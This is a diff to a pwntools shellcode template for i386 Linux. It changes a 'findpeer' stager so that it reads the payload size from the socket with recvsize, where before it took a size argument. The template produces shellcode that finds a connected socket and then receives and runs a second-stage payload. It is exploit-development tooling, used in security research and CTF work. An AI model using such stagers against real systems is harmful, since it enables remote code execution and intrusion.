@@ -1,12 +1,12 @@
 <% from pwnlib.shellcraft import common %>
 <% from pwnlib.shellcraft.i386 import linux %>
 <%docstring>
-Findpeer + stager
+Findpeer recvsize stager
 Args:
-    size, the size of the payload
     port, the port given to findpeer (defaults to any)
 </%docstring>
-<%page args="size, port = None"/>
+<%page args="port = None"/>
 
 ${linux.findpeer(port)}
-${linux.stager("esi", size)}
+${linux.recvsize('esi', 'ecx')}
+${linux.stager('ebx', 'ecx')}
